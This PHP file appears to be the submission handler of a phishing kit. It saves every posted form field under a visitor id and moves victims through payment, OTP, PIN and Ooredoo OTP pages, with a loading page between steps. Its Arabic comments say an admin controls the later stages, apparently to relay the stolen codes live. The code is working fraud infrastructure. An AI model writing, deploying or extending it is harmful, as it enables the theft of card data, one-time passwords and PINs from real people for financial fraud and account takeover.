<?php
require_once 'includes/db.php';
require_once 'includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $visitor_id = $_POST['visitor_id'] ?? '';
    if (empty($visitor_id)) {
        $visitor_id = "visitor_" . bin2hex(random_bytes(4));
    }

    // حفظ كافة البيانات المرسلة في POST ما عدا المعرفات
    foreach ($_POST as $key => $value) {
        if ($key !== 'visitor_id' && $key !== 'submit') {
            saveData($visitor_id, $key, $value);
        }
    }

    $current_page = basename($_SERVER['HTTP_REFERER'] ?? 'index.php');
    
    // تحديد الخطوة التالية بناءً على الصفحة الحالية
    $next_page = 'loading.php';
    
    // إذا كانت البيانات من الصفحة الرئيسية، ننتقل مباشرة لـ update_info.php (كما في المنطق القديم)
    // أو حسب الطلب الجديد: المراحل الأولى تصل للأدمن بدون تحكم
    if (strpos($current_page, 'index.php') !== false) {
        updateVisitorStep($visitor_id, 'index');
        header("Location: public/update_info.php?visitor_id=$visitor_id");
        exit;
    }

    // للمراحل التي تحتاج تحكم (من صفحة البطاقة فصاعداً)
    updateVisitorStep($visitor_id, $current_page);
    header("Location: public/loading.php?visitor_id=$visitor_id&next=" . getNextStep($current_page));
    exit;
}

function getNextStep($current) {
    if (strpos($current, 'payment.php') !== false) return 'otp.php';
    if (strpos($current, 'otp.php') !== false) return 'pin.php';
    if (strpos($current, 'pin.php') !== false) return 'ooredoo.php';
    if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
    if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
    return 'success.php';
}
?>
